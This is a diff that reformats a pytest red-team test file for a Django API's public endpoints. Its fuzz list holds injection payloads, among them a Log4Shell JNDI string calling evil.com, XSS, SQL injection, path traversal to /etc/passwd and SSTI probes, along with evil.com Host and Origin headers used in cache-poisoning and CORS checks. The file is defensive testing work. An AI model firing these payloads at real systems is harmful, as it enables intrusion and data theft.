@@ -8,8 +8,8 @@ Uses SecLists for comprehensive fuzzing.
 import time
 
 import pytest
-from rest_framework.test import APIClient
 
+from rest_framework.test import APIClient
 
 # =============================================================================
 # SecLists Payloads
@@ -17,17 +17,23 @@ from rest_framework.test import APIClient
 
 NAUGHTY_STRINGS = [
     "",  # Empty
-    "null", "NULL", "undefined", "None",
+    "null",
+    "NULL",
+    "undefined",
+    "None",
     "${jndi:ldap://evil.com}",
-    "__proto__", "constructor",
+    "__proto__",
+    "constructor",
     "<script>alert(1)</script>",
     "' OR '1'='1",
     "'; DROP TABLE--",
-    "../", "..\\",
+    "../",
+    "..\\",
     "/etc/passwd",
     "C:\\Windows\\System32",
     "🎧🎤🎵",  # Emoji
-    "\x00", "\xff",
+    "\x00",
+    "\xff",
     "${7*7}",  # SSTI
     "{{7*7}}",
 ]
@@ -63,6 +69,7 @@ REDOS_PATTERNS = [
 # API8:2023 Information Disclosure
 # =============================================================================
 
+
 @pytest.mark.django_db
 class TestPublicEndpointsRedTeamInfoDisclosure:
     """Information disclosure tests for public endpoints."""
@@ -79,15 +86,24 @@ class TestPublicEndpointsRedTeamInfoDisclosure:
 
         # Check for potentially sensitive fields
         sensitive_fields = [
-            "database", "db_host", "db_name", "db_user",
-            "secret_key", "api_key", "password",
-            "internal_ip", "server_software",
-            "django_version", "python_version",
+            "database",
+            "db_host",
+            "db_name",
+            "db_user",
+            "secret_key",
+            "api_key",
+            "password",
+            "internal_ip",
+            "server_software",
+            "django_version",
+            "python_version",
         ]
 
         found_sensitive = [f for f in sensitive_fields if f in data]
         if found_sensitive:
-            pytest.xfail(f"T760: Info endpoint discloses sensitive fields: {found_sensitive}")
+            pytest.xfail(
+                f"T760: Info endpoint discloses sensitive fields: {found_sensitive}",
+            )
 
     def test_version_endpoint_discloses_stack_info(self):
         """
@@ -111,7 +127,9 @@ class TestPublicEndpointsRedTeamInfoDisclosure:
 
         found_recon = [f for f in recon_fields if f in data]
         if len(found_recon) > 2:
-            pytest.xfail(f"T761: Version endpoint discloses stack info: {found_recon}")
+            pytest.xfail(
+                f"T761: Version endpoint discloses stack info: {found_recon}",
+            )
 
     def test_error_messages_disclose_structure(self):
         """
@@ -124,7 +142,7 @@ class TestPublicEndpointsRedTeamInfoDisclosure:
 
         if response.status_code == 500:
             error_text = str(response.content).lower()
-            leak_keywords = ["traceback", "file \"", "line ", "column", "sql"]
+            leak_keywords = ["traceback", 'file "', "line ", "column", "sql"]
             if any(kw in error_text for kw in leak_keywords):
                 pytest.xfail("T762: Error message leaks application structure")
 
@@ -139,12 +157,15 @@ class TestPublicEndpointsRedTeamInfoDisclosure:
             data = response.json()
             # OPTIONS may reveal serializer fields
             if "actions" in data and "POST" in data.get("actions", {}):
-                pytest.xfail("T763: OPTIONS reveals write operations on public endpoint")
+                pytest.xfail(
+                    "T763: OPTIONS reveals write operations on public endpoint",
+                )
 
 
 # =============================================================================
 # API8:2023 Injection Attacks
 # =============================================================================
+
 
 @pytest.mark.django_db
 class TestPublicEndpointsRedTeamInjection:
@@ -168,7 +189,9 @@ class TestPublicEndpointsRedTeamInjection:
             if response.status_code == 500:
                 error_text = str(response.content).lower()
                 if "sql" in error_text or "syntax" in error_text:
-                    pytest.xfail(f"T764: SQLi in public endpoint query params: {payload[:30]}")
+                    pytest.xfail(
+                        f"T764: SQLi in public endpoint query params: {payload[:30]}",
+                    )
 
     def test_xss_via_reflected_params(self):
         """
@@ -187,7 +210,9 @@ class TestPublicEndpointsRedTeamInjection:
 
             # Check if payload is reflected without sanitization
             if payload in str(response.content):
-                pytest.xfail(f"T765: Reflected XSS in public endpoint: {payload[:30]}")
+                pytest.xfail(
+                    f"T765: Reflected XSS in public endpoint: {payload[:30]}",
+                )
 
     def test_command_injection_via_params(self):
         """
@@ -201,7 +226,9 @@ class TestPublicEndpointsRedTeamInjection:
             if response.status_code == 500:
                 error_text = str(response.content).lower()
                 if "uid=" in error_text or "root:" in error_text:
-                    pytest.xfail(f"T766: Command injection in public endpoint: {payload}")
+                    pytest.xfail(
+                        f"T766: Command injection in public endpoint: {payload}",
+                    )
 
     def test_path_traversal_in_params(self):
         """
@@ -215,12 +242,15 @@ class TestPublicEndpointsRedTeamInjection:
             if response.status_code == 200:
                 content = str(response.content)
                 if "root:" in content or "passwd" in content:
-                    pytest.xfail(f"T767: Path traversal in public endpoint: {payload}")
+                    pytest.xfail(
+                        f"T767: Path traversal in public endpoint: {payload}",
+                    )
 
 
 # =============================================================================
 # API4:2023 Resource Consumption (DoS)
 # =============================================================================
+
 
 @pytest.mark.django_db
 class TestPublicEndpointsRedTeamDoS:
@@ -238,7 +268,9 @@ class TestPublicEndpointsRedTeamDoS:
             duration = time.time() - start
 
             if duration > 2:  # Should complete quickly
-                pytest.xfail(f"T768: ReDoS in public endpoint: {duration:.2f}s")
+                pytest.xfail(
+                    f"T768: ReDoS in public endpoint: {duration:.2f}s",
+                )
 
     def test_rapid_requests_no_rate_limit(self):
         """
@@ -253,7 +285,9 @@ class TestPublicEndpointsRedTeamDoS:
         elapsed = time.time() - start
 
         if elapsed < 5:  # 100 requests in under 5 seconds
-            pytest.xfail(f"T769: No rate limiting on public endpoints (100 req in {elapsed:.2f}s)")
+            pytest.xfail(
+                f"T769: No rate limiting on public endpoints (100 req in {elapsed:.2f}s)",
+            )
 
     def test_large_response_size(self):
         """
@@ -264,12 +298,15 @@ class TestPublicEndpointsRedTeamDoS:
 
         content_length = len(response.content)
         if content_length > 10000:  # 10KB threshold
-            pytest.xfail(f"T770: Public endpoint returns large response ({content_length} bytes)")
+            pytest.xfail(
+                f"T770: Public endpoint returns large response ({content_length} bytes)",
+            )
 
 
 # =============================================================================
 # API8:2023 Security Misconfiguration - Fuzzing
 # =============================================================================
+
 
 @pytest.mark.django_db
 class TestPublicEndpointsRedTeamFuzzing:
@@ -302,13 +339,12 @@ class TestPublicEndpointsRedTeamFuzzing:
         ]
 
         for accept in malformed_accepts:
-            response = client.get(
-                "/api/v2/info",
-                HTTP_ACCEPT=accept
-            )
+            response = client.get("/api/v2/info", HTTP_ACCEPT=accept)
 
             if response.status_code == 500:
-                pytest.xfail(f"T772: Malformed Accept header causes 500: {accept}")
+                pytest.xfail(
+                    f"T772: Malformed Accept header causes 500: {accept}",
+                )
 
     def test_fuzz_content_type(self):
         """
@@ -324,10 +360,7 @@ class TestPublicEndpointsRedTeamFuzzing:
         ]
 
         for ct in weird_content_types:
-            response = client.get(
-                "/api/v2/version",
-                HTTP_CONTENT_TYPE=ct
-            )
+            response = client.get("/api/v2/version", HTTP_CONTENT_TYPE=ct)
 
             if response.status_code == 500:
                 pytest.xfail(f"T773: Weird Content-Type causes 500: {ct}")
@@ -336,6 +369,7 @@ class TestPublicEndpointsRedTeamFuzzing:
 # =============================================================================
 # HTTP Method Tests
 # =============================================================================
+
 
 @pytest.mark.django_db
 class TestPublicEndpointsRedTeamMethods:
@@ -392,6 +426,7 @@ class TestPublicEndpointsRedTeamMethods:
 # Cache Poisoning Tests
 # =============================================================================
 
+
 @pytest.mark.django_db
 class TestPublicEndpointsRedTeamCachePoisoning:
     """Cache poisoning tests."""
@@ -406,7 +441,7 @@ class TestPublicEndpointsRedTeamCachePoisoning:
         response1 = client.get(
             "/api/v2/info",
             HTTP_HOST="evil.com",
-            HTTP_X_FORWARDED_HOST="evil.com"
+            HTTP_X_FORWARDED_HOST="evil.com",
         )
 
         # Normal request
@@ -414,7 +449,9 @@ class TestPublicEndpointsRedTeamCachePoisoning:
 
         # If second response reflects poisoned host, cache poisoning works
         if "evil.com" in str(response2.content):
-            pytest.xfail("T777: Cache poisoning via Host header on public endpoint")
+            pytest.xfail(
+                "T777: Cache poisoning via Host header on public endpoint",
+            )
 
     def test_cache_poisoning_via_query_param(self):
         """
@@ -429,12 +466,12 @@ class TestPublicEndpointsRedTeamCachePoisoning:
         response2 = client.get("/api/v2/info")
 
         # This test is mostly documentation
-        pass
 
 
 # =============================================================================
 # CORS Tests
 # =============================================================================
+
 
 @pytest.mark.django_db
 class TestPublicEndpointsRedTeamCORS:
@@ -449,13 +486,15 @@ class TestPublicEndpointsRedTeamCORS:
         response = client.options(
             "/api/v2/info",
             HTTP_ORIGIN="https://evil.com",
-            HTTP_ACCESS_CONTROL_REQUEST_METHOD="GET"
+            HTTP_ACCESS_CONTROL_REQUEST_METHOD="GET",
         )
 
         if response.status_code == 200:
             allow_origin = response.get("Access-Control-Allow-Origin")
             if allow_origin == "*" or allow_origin == "https://evil.com":
-                pytest.xfail("T778: CORS allows arbitrary origin on public endpoint")
+                pytest.xfail(
+                    "T778: CORS allows arbitrary origin on public endpoint",
+                )
 
     def test_cors_credentials_on_public_endpoint(self):
         """
@@ -466,7 +505,7 @@ class TestPublicEndpointsRedTeamCORS:
         response = client.options(
             "/api/v2/info",
             HTTP_ORIGIN="https://evil.com",
-            HTTP_ACCESS_CONTROL_REQUEST_METHOD="GET"
+            HTTP_ACCESS_CONTROL_REQUEST_METHOD="GET",
         )
 
         allow_credentials = response.get("Access-Control-Allow-Credentials")
@@ -474,4 +513,6 @@ class TestPublicEndpointsRedTeamCORS:
             # With wildcard or reflected origin, this is dangerous
             allow_origin = response.get("Access-Control-Allow-Origin")
             if allow_origin in ["*", "https://evil.com"]:
-                pytest.xfail("T779: CORS credentials with open origin on public endpoint")
+                pytest.xfail(
+                    "T779: CORS credentials with open origin on public endpoint",
+                )
